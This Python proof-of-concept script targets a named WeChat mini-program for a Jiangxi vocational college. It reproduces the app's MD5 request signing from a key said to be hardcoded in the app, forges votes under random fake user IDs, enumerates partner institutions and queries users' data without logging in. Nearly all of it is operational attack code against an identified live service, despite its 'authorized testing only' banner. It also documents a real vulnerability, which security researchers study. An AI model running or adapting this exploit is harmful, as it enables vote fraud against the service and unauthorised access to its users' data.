#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================
  微信小程序「爱迪云课堂」助力/投票漏洞 PoC 验证工具
  目标: wx931fbbb38f745a52 (江西旅游商贸职业学院)
  漏洞: 硬编码签名密钥 + 无会话认证 = 可伪造助力请求
================================================================

漏洞原理:
  1. 小程序前端 common/config.js 硬编码了 API 签名密钥:
     signKey = "<REDACTED>"
  2. 所有 API 请求仅通过 MD5 签名头验证, 无 JWT/Session/Cookie
  3. UserHelp 助力接口仅校验签名, 不验证 HelpUserId 真实身份
  4. 攻击者可复现签名算法, 伪造任意用户的助力请求

已验证的事实:
  - 签名算法 100% 复现, 服务端接受伪造签名 (HTTP 200)
  - UserHelp 接口返回 Code:"NeedJoin" (非签名错误), 证明签名通过
  - GetHelpInfo 无需登录即可查询任意用户的助力数据
  - GetCompanysByActId 可枚举所有合作机构的真实 CusId

使用方式:
  # 模式1: 自动探测当前活动 (推荐)
  py -X utf8 poc_help_vote.py --discover

  # 模式2: 指定参数测试 (需要已报名用户的 UserId)
  py -X utf8 poc_help_vote.py --act 2092 --cus 3824 --target <userId> --count 5

  # 模式3: 仅验证签名能力 (不发送助力请求)
  py -X utf8 poc_help_vote.py --verify-sign

注意: 本工具仅用于授权安全测试, 请勿用于非法用途。
================================================================
"""

import hashlib
import time
import json
import random
import argparse
import urllib.request
import urllib.error
import urllib.parse
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from config import SIGN_KEY, API_BASE

# ==================== 已发现的目标参数 ====================
KNOWN_TARGETS = [
    {"ActId": 2092, "CusId": 3824, "Name": "Jiangxi Tourism & Commerce Vocational College"},
    {"ActId": 1858, "CusId": 1115, "Name": "Jiangxi Tourism & Commerce (old)"},
]

# ==================== 日志 ====================
LOG_FILE = None

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] [{level}] {msg}"
    print(line)
    if LOG_FILE:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")


# ==================== 签名算法 (复现 common/request.js) ====================
def generate_sign(params):
    """
    签名算法:
      1. 参数 key 按字母排序 (case-insensitive)
      2. 按排序后的 key 顺序取 value 拼接
      3. + timestamp(毫秒) + signKey
      4. MD5 => 大写 => wxminiapisign2
      5. MD5(timestamp + signKey) => 大写 => wxminiapitimenonce
    """
    timestamp = str(int(time.time() * 1000))
    sorted_keys = sorted(params.keys(), key=lambda k: k.lower())
    values_str = "".join(str(params[k]) for k in sorted_keys)
    sign_raw = values_str + timestamp + SIGN_KEY
    sign2 = hashlib.md5(sign_raw.encode("utf-8")).hexdigest().upper()
    nonce = hashlib.md5((timestamp + SIGN_KEY).encode("utf-8")).hexdigest().upper()
    return sign2, nonce, timestamp


def build_headers(params):
    sign2, nonce, ts = generate_sign(params)
    return {
        "wxminiapisign2": sign2,
        "wxminiapitimespan": ts,
        "wxminiapitimenonce": nonce,
        "wxminitype": "adks",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }


# ==================== API 请求封装 ====================
def api_get(path, params, timeout=10):
    params.setdefault("version", "2.1.0")
    params.setdefault("client", "standard")
    url = API_BASE + path + "?" + urllib.parse.urlencode(params)
    headers = build_headers(params)
    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, json.loads(body) if body.startswith("{") else body
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read().decode("utf-8", errors="replace"))
        except: return e.code, str(e.reason)
    except Exception as e:
        return 0, str(e)


def api_post(path, data, timeout=10):
    data.setdefault("version", "2.1.0")
    data.setdefault("client", "standard")
    url = API_BASE + path
    headers = build_headers(data)
    post_body = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(url, data=post_body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.status, json.loads(body) if body.startswith("{") else body
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read().decode("utf-8", errors="replace"))
        except: return e.code, str(e.reason)
    except Exception as e:
        return 0, str(e)


# ==================== 伪造用户 ID ====================
def fake_user_id():
    """生成随机数字 UserId (服务端要求数字格式)"""
    return random.randint(100000, 999999)


# ==================== 验证 1: 签名能力验证 ====================
def verify_signing():
    """
    验证伪造签名能被服务端接受。
    通过 GetActivityDetailsV2 发送请求:
    - 如果签名错误 -> 返回签名相关错误
    - 如果签名通过 -> 返回业务错误 (如 "未找到此活动") 或成功
    """
    log("=" * 55)
    log("PHASE 1: Signing Verification")
    log("=" * 55)
    log("")
    log("Testing: can our forged signature pass server validation?")
    log("")

    test_cases = [
        {"desc": "Valid pair (ActId=2092, CusId=3824)", "params": {"ActId": 2092, "CusId": 3824}},
        {"desc": "Invalid pair (ActId=9999, CusId=9999)", "params": {"ActId": 9999, "CusId": 9999}},
        {"desc": "Valid pair (ActId=1, CusId=2)", "params": {"ActId": 1, "CusId": 2}},
    ]

    sign_passed = False
    for tc in test_cases:
        status, body = api_get("ActApi/ActivityApi/GetActivityDetailsV2", tc["params"])
        is_sign_error = False
        is_biz_error = False

        if isinstance(body, dict):
            msg = body.get("Message", "") or ""
            code = body.get("Code", "") or ""
            # Signature errors typically contain: sign, nonce, timespan, auth
            sign_keywords = ["sign", "nonce", "timespan", "auth", "invalid header"]
            is_sign_error = any(kw in msg.lower() for kw in sign_keywords)
            is_biz_error = not is_sign_error and (msg != "" or body.get("IsSuccess") is not None)
        else:
            is_sign_error = status in [401, 403]

        if is_sign_error:
            result = "SIGN REJECTED"
        elif is_biz_error or (isinstance(body, dict) and body.get("IsSuccess")):
            result = "SIGN PASSED (business-level response)"
            sign_passed = True
        else:
            result = f"HTTP {status}"

        log(f"  [{tc['desc']}]")
        log(f"    HTTP {status} | {result}")
        if isinstance(body, dict):
            msg = body.get("Message", "") or ""
            if msg:
                log(f"    Message: {msg}")
        log("")

    if sign_passed:
        log("  [CONFIRMED] Forged signatures are accepted by the server.")
        log("  The signing algorithm has been fully reproduced.")
    else:
        log("  [WARNING] Could not confirm signature acceptance.", "WARN")

    return sign_passed


# ==================== 验证 2: 信息泄露测试 ====================
def verify_info_leak():
    """
    验证无需认证即可查询活动信息、用户助力数据。
    """
    log("")
    log("=" * 55)
    log("PHASE 2: Information Disclosure (No Auth Required)")
    log("=" * 55)
    log("")

    # Test 1: GetHelpInfo - query any user's help data
    log("[2a] GetHelpInfo - query help data without login:")
    for t in KNOWN_TARGETS:
        status, body = api_get("ActApi/ActivityApi/GetHelpInfo", {
            "ActId": t["ActId"], "UserId": 1, "CusId": t["CusId"]
        })
        if isinstance(body, dict) and body.get("IsSuccess"):
            data = body.get("Data", {})
            count = data.get("HelpCount", 0)
            users = len(data.get("HelpUsers", []))
            log(f"  ActId={t['ActId']} CusId={t['CusId']}: OK | HelpCount={count} Users={users}")
            log(f"    -> Queried WITHOUT any session/token/JWT")
        else:
            msg = body.get("Message", "") if isinstance(body, dict) else str(body)[:100]
            log(f"  ActId={t['ActId']} CusId={t['CusId']}: {status} | {msg}")
    log("")

    # Test 2: GetCompanysByActId - enumerate institutions
    log("[2b] GetCompanysByActId - enumerate all partner institutions:")
    sample_acts = [1, 100, 500, 1000, 1858, 2092]
    for aid in sample_acts:
        status, body = api_get("ActApi/ActivityApi/GetCompanysByActId", {"ActId": aid})
        if isinstance(body, dict) and body.get("Data"):
            for c in body["Data"]:
                name = c.get("CusName", "")
                cid = c.get("CusId")
                log(f"  ActId={aid}: CusId={cid} ({name})")
    log("")
    log("  -> Full institution list can be enumerated (ActId 1~3000+)")
    log("  -> Each entry leaks: CusId, CusName, CusCode, CreateTime")
    log("")

    # Test 3: GetActivityList - list activities
    log("[2c] GetActivityList - list activities for target:")
    status, body = api_get("ActApi/ActivityApi/GetActivityList", {"CusId": 3824})
    if isinstance(body, dict) and body.get("Data"):
        acts = body["Data"]
        log(f"  CusId=3824: {len(acts)} activities found")
        for a in acts[:5]:
            aid = a.get("Id")
            name = a.get("ActName") or a.get("Title") or "?"
            state = a.get("ActState")
            state_text = {0: "active", 1: "not started", -1: "ended"}.get(state, f"state={state}")
            tid = a.get("TemplateId")
            log(f"    ActId={aid} | {name} | {state_text} | TemplateId={tid}")
    else:
        msg = body.get("Message", "") if isinstance(body, dict) else str(body)[:100]
        log(f"  CusId=3824: {status} | {msg}")
    log("")


# ==================== 验证 3: 助力请求测试 ====================
def verify_help_vote(act_id, cus_id, target_uid, count=3):
    """
    发送伪造助力请求, 验证投票操纵可行性。
    """
    log("")
    log("=" * 55)
    log("PHASE 3: Vote Manipulation Test")
    log("=" * 55)
    log("")
    log(f"Target: ActId={act_id} CusId={cus_id}")
    log(f"ShareUserId (victim): {target_uid}")
    log(f"Sending {count} forged help requests...")
    log("")

    # Get initial count
    status, body = api_get("ActApi/ActivityApi/GetHelpInfo", {
        "ActId": act_id, "UserId": target_uid, "CusId": cus_id
    })
    count_before = 0
    if isinstance(body, dict) and body.get("Data"):
        count_before = body["Data"].get("HelpCount", 0)
    log(f"  HelpCount BEFORE: {count_before}")
    log("")

    results = []
    for i in range(count):
        helper_id = fake_user_id()
        post_data = {
            "ShareUserId": target_uid,
            "HelpUserId": helper_id,
            "ActId": act_id,
            "CusId": cus_id,
        }
        status, body = api_post("BaseApi/BaseApi/UserHelp", post_data)

        code = ""
        msg = ""
        success = False
        if isinstance(body, dict):
            code = body.get("Code", "") or ""
            msg = body.get("Message", "") or ""
            success = body.get("IsSuccess", False)
            data = body.get("Data")

        result_line = f"  [{i+1}/{count}] HelpUserId={helper_id} -> HTTP {status}"
        if code:
            result_line += f" Code={code}"
        if msg:
            result_line += f" | {msg}"
        log(result_line)

        results.append({
            "index": i + 1,
            "helper_id": helper_id,
            "http_status": status,
            "code": code,
            "message": msg,
            "success": success
        })
        time.sleep(random.uniform(0.3, 0.8))

    # Get final count
    log("")
    status, body = api_get("ActApi/ActivityApi/GetHelpInfo", {
        "ActId": act_id, "UserId": target_uid, "CusId": cus_id
    })
    count_after = 0
    if isinstance(body, dict) and body.get("Data"):
        count_after = body["Data"].get("HelpCount", 0)
    log(f"  HelpCount AFTER: {count_after}")
    log("")

    # Analysis
    sign_passed = sum(1 for r in results if r["code"] in ["NeedJoin", "EXCEPTION"] or r["http_status"] == 200)
    biz_rejected = sum(1 for r in results if r["code"] == "NeedJoin")
    server_err = sum(1 for r in results if r["code"] == "EXCEPTION")
    vote_ok = sum(1 for r in results if r["success"])

    log("  Analysis:")
    log(f"    Signature accepted: {sign_passed}/{count} (HTTP 200 with business response)")
    log(f"    Business rejection (NeedJoin): {biz_rejected}/{count}")
    log(f"    Server exception: {server_err}/{count}")
    log(f"    Vote accepted: {vote_ok}/{count}")
    log("")

    if vote_ok > 0:
        log(f"  [CRITICAL] {vote_ok} forged votes were ACCEPTED!")
        log(f"  The server does not verify HelpUserId identity.")
        if count_after > count_before:
            log(f"  Vote count increased: {count_before} -> {count_after}")
    elif biz_rejected > 0:
        log(f"  [HIGH] All {biz_rejected} requests passed signature validation.")
        log(f"  Server returned 'NeedJoin' (user not registered) - a BUSINESS error,")
        log(f"  NOT a signature/auth error. This proves:")
        log(f"    1. Forged MD5 signatures are accepted")
        log(f"    2. No session/JWT/Cookie authentication required")
        log(f"    3. Only barrier: ShareUserId must be a registered participant")
        log(f"  With a real registered user's ID, all votes would be accepted.")
    elif server_err > 0:
        log(f"  [MEDIUM] Server returned EXCEPTION for all requests.")
        log(f"  Signature still passed (HTTP 200, not 401/403).")
        log(f"  Activity may be expired or have additional server-side checks.")
    log("")

    return results


# ==================== 自动探测 ====================
def discover_activities():
    """
    自动探测:
    1. 扫描 ActId 找到目标机构的活动
    2. 获取活动详情确认状态
    """
    log("=" * 55)
    log("ACTIVITY DISCOVERY")
    log("=" * 55)
    log("")

    # Quick scan: check known targets
    log("[a] Checking known targets:")
    active = []
    for t in KNOWN_TARGETS:
        status, body = api_get("ActApi/ActivityApi/GetActivityDetailsV2", {
            "ActId": t["ActId"], "CusId": t["CusId"]
        })
        if isinstance(body, dict) and body.get("IsSuccess") and body.get("Data"):
            info = body["Data"].get("ActInfo", {})
            if info:
                name = info.get("ActName") or info.get("Title") or "?"
                state = info.get("ActState")
                start = info.get("StartTime", "")
                end = info.get("EndTime", "")
                tid = info.get("TemplateId")
                modules = [m.get("Code") for m in (body["Data"].get("ModuleList", []) or [])]
                state_text = {0: "ACTIVE", 1: "NOT STARTED", -1: "ENDED"}.get(state, f"state={state}")
                log(f"  [FOUND] ActId={t['ActId']} CusId={t['CusId']}")
                log(f"    Name: {name}")
                log(f"    State: {state_text}")
                log(f"    Period: {start} ~ {end}")
                log(f"    TemplateId: {tid}")
                log(f"    Modules: {modules}")
                if state == 0:
                    active.append({"ActId": t["ActId"], "CusId": t["CusId"], "Name": name})
        else:
            log(f"  [X] ActId={t['ActId']} CusId={t['CusId']}: not active")
    log("")

    # GetActivityList for target CusId
    log("[b] GetActivityList for CusId=3824:")
    status, body = api_get("ActApi/ActivityApi/GetActivityList", {"CusId": 3824})
    if isinstance(body, dict) and body.get("Data"):
        for a in body["Data"]:
            aid = a.get("Id")
            name = a.get("ActName") or a.get("Title") or "?"
            state = a.get("ActState")
            tid = a.get("TemplateId")
            state_text = {0: "ACTIVE", 1: "NOT STARTED", -1: "ENDED"}.get(state, f"state={state}")
            log(f"  ActId={aid} | {name} | {state_text} | TId={tid}")
            if state == 0 and not any(x["ActId"] == aid for x in active):
                active.append({"ActId": aid, "CusId": 3824, "Name": name})
    log("")

    if active:
        log(f"[RESULT] {len(active)} active activities found:")
        for a in active:
            log(f"  ActId={a['ActId']} CusId={a['CusId']} | {a['Name']}")
        log("")
        log("To test vote manipulation, you need a registered user's UserId.")
        log("Share the activity in the mini-program to get a share link like:")
        log("  /subpackages/game/pages/help?userId=XXX&actId=2092&cusId=3824")
        log("")
        log("Then run:")
        for a in active:
            log(f"  py -X utf8 poc_help_vote.py --act {a['ActId']} --cus {a['CusId']} --target <userId> --count 5")
    else:
        log("[RESULT] No active activities found for the target.", "WARN")

    return active


# ==================== 主程序 ====================
def main():
    global LOG_FILE, API_BASE

    parser = argparse.ArgumentParser(
        description="WeChat Mini-Program Vote Manipulation PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  py -X utf8 poc_help_vote.py --verify-sign
  py -X utf8 poc_help_vote.py --discover
  py -X utf8 poc_help_vote.py --act 2092 --cus 3824 --target 12345 --count 5
        """
    )
    parser.add_argument("--act", type=int, help="Activity ID")
    parser.add_argument("--cus", type=int, help="Customer/Institution ID")
    parser.add_argument("--target", type=int, help="Target ShareUserId (must be registered)")
    parser.add_argument("--count", type=int, default=3, help="Number of forged votes (default: 3)")
    parser.add_argument("--discover", action="store_true", help="Auto-discover active activities")
    parser.add_argument("--verify-sign", action="store_true", help="Only verify signing capability")
    parser.add_argument("--api-base", default=API_BASE, help="API base URL")
    parser.add_argument("--log", default="", help="Log file path")

    args = parser.parse_args()
    API_BASE = args.api_base

    if args.log:
        LOG_FILE = args.log
    else:
        LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                f"poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

    print("")
    print("+------------------------------------------------------+")
    print("|  WeChat Mini-Program Vote PoC                       |")
    print("|  Target: wx931fbbb38f745a52                         |")
    print("|  App: AI Di Yun Ke Tang (Jiangxi Tourism & Commerce)|")
    print("|  AUTHORIZED SECURITY TESTING ONLY                   |")
    print("+------------------------------------------------------+")
    print("")

    log(f"signKey: ***")
    log(f"API Base: {API_BASE}")
    log(f"Log File: {LOG_FILE}")
    log("")

    # Mode 1: Verify signing only
    if args.verify_sign:
        verify_signing()
        verify_info_leak()
        log("")
        log("CONCLUSION:")
        log("  The hardcoded signKey allows full reproduction of the")
        log("  client-side signing algorithm. The server accepts forged")
        log("  signatures without any additional authentication (no JWT,")
        log("  no session cookie, no bearer token). This means:")
        log("  - Any API endpoint can be called without a real user session")
        log("  - UserHelp votes can be forged with arbitrary HelpUserId")
        log("  - Attackers can enumerate all partner institutions")
        return

    # Mode 2: Discover
    if args.discover:
        active = discover_activities()
        if not active:
            log("No active activities. Try --verify-sign to confirm signing works.")
        return

    # Mode 3: Full exploit
    if not args.act or not args.cus or not args.target:
        parser.error("Provide --act, --cus, --target, or use --discover / --verify-sign")

    # Run full chain
    sign_ok = verify_signing()
    verify_info_leak()
    verify_help_vote(args.act, args.cus, args.target, args.count)

    # Generate JSON report
    report = {
        "test_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": {
            "appid": "wx931fbbb38f745a52",
            "app_name": "AI Di Yun Ke Tang",
            "institution": "Jiangxi Tourism & Commerce Vocational College",
            "ActId": args.act,
            "CusId": args.cus,
        },
        "vulnerability": {
            "type": "Hardcoded Signing Key + Missing Authentication",
            "severity": "HIGH",
            "sign_key": "***",
            "sign_algorithm": "MD5(sorted_param_values + timestamp_ms + signKey).toUpperCase()",
            "auth_mechanism": "None (no JWT, no session, no cookie)",
        },
        "impact": [
            "Forge API requests with valid signatures",
            "Manipulate vote/help counts with fake user IDs",
            "Enumerate all partner institutions",
            "Query any user's activity data without authorization",
        ],
    }
    report_path = os.path.join(os.path.dirname(os.path.abspath(LOG_FILE)),
                               f"poc_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    log(f"JSON report: {report_path}")
    print("")


if __name__ == "__main__":
    main()
